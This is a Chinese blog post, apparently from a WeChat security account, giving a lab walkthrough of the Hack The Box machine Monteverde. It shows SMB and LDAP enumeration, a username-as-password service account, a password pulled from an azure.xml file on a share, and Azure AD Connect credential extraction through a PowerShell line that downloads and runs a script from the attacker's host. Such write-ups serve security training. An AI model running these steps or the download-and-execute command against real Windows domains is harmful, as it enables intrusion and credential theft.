@@ -1,0 +1,129 @@
+> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/P7WoOZMA3udVKMrvpQN5iA)
+
+一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)
+
+  
+
+  
+
+大家好，这里是 **大余安全** 的第 **181** 篇文章，本公众号会每日分享攻防渗透技术给大家。
+
+靶机地址：https://www.hackthebox.eu/home/machines/profile/223
+
+靶机难度：中级（4.3/10）
+
+靶机发布日期：2020 年 3 月 23 日
+
+靶机描述：
+
+Monteverde is an easy Windows machine that features Azure AD Connect. The domain is enumerated and a user list is created. Through password spraying, the SABatchJobs service account is found to have the username as a password. Using this service account, it is possible to enumerate SMB Shares on the system, and the $users share is found to be world-readable. An XML file used for an Azure AD account is found within a user folder and contains a password. Due to password reuse, we can connect to the domain controller as mhope using WinRM.
+
+Enumeration shows that Azure AD Connect is installed. It is possible to extract the credentials for the account that replicates the directory changes to Azure (in this case the default domain administrator).
+
+请注意：对于所有这些计算机，我是通过平台授权允许情况进行渗透的。我将使用 Kali Linux 作为解决该 HTB 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。
+
+![](https://mmbiz.qpic.cn/mmbiz_png/rKdlf9hSNpfCqPA8UdaiceRUpg1OKWoe0SeG5n9kHNoZvhH0T50blgJBdCnTeXOVV9P1FyQTd7ZvyVg3zKdXEfg/640?wx_fmt=png)
+
+![](https://mmbiz.qpic.cn/mmbiz_png/N97UqqP68bKia0MeqTicbrbqUzibtGia5wC1gXBWC1KX0sZibHgrFnbicoUj1kvg7wH8L0m7RYCHOE5fatKxC8ABRiaNg/640?wx_fmt=png)
+
+一、信息收集
+
+![](https://mmbiz.qpic.cn/mmbiz_png/LcN5ZibxypT4ZquODsTZNAnXQXiaroUzDVrc8jrXcHVIIZ0PU62PUeJp0qIpWyHJwCavXTBs5rsicPKULd2EA7vicw/640?wx_fmt=png)
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPPMqGcQzd3MRMicNMGlM7qLUlQUrKuqfibkU39uDYJBZvuBNHRr3P24fiben1o8oeyysjXnew5Gufsw/640?wx_fmt=png)
+
+可以看到靶机的 IP 是 10.10.10.172...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPPMqGcQzd3MRMicNMGlM7qLMRicmrqcChEO1LaYG2h5NgKITWRhZsaeP3SIXrSRZDVdQdCDSaAGAkA/640?wx_fmt=png)
+
+可看到 nmap 开了很多端口，其中有端口 53（DNS），389（LDAP）和 445（SMB）等.... 和上一台一样开始枚举 LDAP..
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPPMqGcQzd3MRMicNMGlM7qLnEO462kkFV6bia8UwzaFJ4z11h6LGUxtU9xS4GU1EJtpSamz4ONt46A/640?wx_fmt=png)
+
+```
+enum4linux -a 10.10.10.172
+```
+
+枚举获得了用户名信息....
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPPMqGcQzd3MRMicNMGlM7qLc5Pl2zCRVZoT2AurfLQRmAY2dkN3ibgysavTnOm7E4Ria7ico7gzLaRkQ/640?wx_fmt=png)
+
+```
+smbmap -H 10.10.10.172 -u SABatchJobs -p SABatchJobs
+```
+
+这里通过 crackmapexec 测试，发现用户名和密码是一致的... 利用 smbmap 查看了 smb 下有什么信息...
+
+发现 users，继续枚举发现了目录下存在 azure.xml 文件，可能存在 azure 漏洞利用了....
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPPMqGcQzd3MRMicNMGlM7qLJqII9WPm6uNCmwcibyILWfzs0oI4avWvEBBibdc56COJoTDSWZxuxldQ/640?wx_fmt=png)
+
+```
+smbclient -U SABatchJobs //10.10.10.172/users$ SABatchJobs -c 'get mhope/azure.xml azure.xml'
+```
+
+下载到本地，打开发现了 passwd 信息...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPPMqGcQzd3MRMicNMGlM7qLg1NaZ9cGRcogrJzQMdtQ1iat6lfIIapeO0w7bAOCia3cTZMgd9qoadXw/640?wx_fmt=png)
+
+由于该配置文件位于 mhope 的目录中，这里猜想用户就是 mhope...
+
+尝试利用 winrm 成功登录... 获得了 user_flag 信息....
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPPMqGcQzd3MRMicNMGlM7qLaYxCjR9uPexiaXicUIV1qWODSiaiaOHG2ZXNibIYGLYlcLy2JzjxaXbSgNA/640?wx_fmt=png)
+
+由于前面遇到了 azure.xml 信息，直接枚举了 mhope 用户群组，发现了 * Azure Admins...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPPMqGcQzd3MRMicNMGlM7qLtmTLGECTrChQmUFgHibbedwKfa1oH2opawib3MichKkj9vSfu1hI7oHicw/640?wx_fmt=png)
+
+查看到了很多应用程序...
+
+https://blog.xpnsec.com/azuread-connect-for-redteam/   --- 如何利用 Azure 漏洞
+
+Azure 漏洞较严重，可以直接获得用户名密码信息...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPPMqGcQzd3MRMicNMGlM7qLA6FVbnnO5icEI3supwbUmssd6q5CZ8FLXjoMOD8H5Wce7GToS2EXsaQ/640?wx_fmt=png)
+
+```
+iex(new-object net.webclient).downloadstring('http://10.10.14.2/Azureshell.ps1')
+https://myitworld.azurewebsites.net/2015/12/14/access-sql-server-integrated-security-different-windows-credentials-powershell/  ---EXP
+https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1  --EXP
+```
+
+这里的 poc 谷歌上很多... 也很多解释了 Azure exploit 的方法... 感兴趣的多了解下...
+
+直接利用脚本获得了 administrator 用户名密码...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPPMqGcQzd3MRMicNMGlM7qLtjI9QPibicgA9SAia5icwjntesRebpxVLrtV3K0GibUnWUYEJSwAQGEic4bA/640?wx_fmt=png)
+
+利用 winrm 登录了 administrator 用户后，获得了 root_flag 信息...
+
+好久没打 windows 渗透了，回来打两台发现挺简单的...
+
+两台都是 smb 和 ldap 中信息收集然后提权....
+
+由于我们已经成功得到 root 权限查看 user 和 root.txt，因此完成这台中级的靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。
+
+如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。
+
+![](https://mmbiz.qpic.cn/mmbiz_png/rKdlf9hSNpfCqPA8UdaiceRUpg1OKWoe0SeG5n9kHNoZvhH0T50blgJBdCnTeXOVV9P1FyQTd7ZvyVg3zKdXEfg/640?wx_fmt=png)
+
+如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~
+
+![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)
+
+![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)
+
+随缘收徒中~~ **随缘收徒中~~** **随缘收徒中~~**
+
+欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！
+
+![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  
+
+大余安全
+
+一个全栈渗透小技巧的公众号
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)
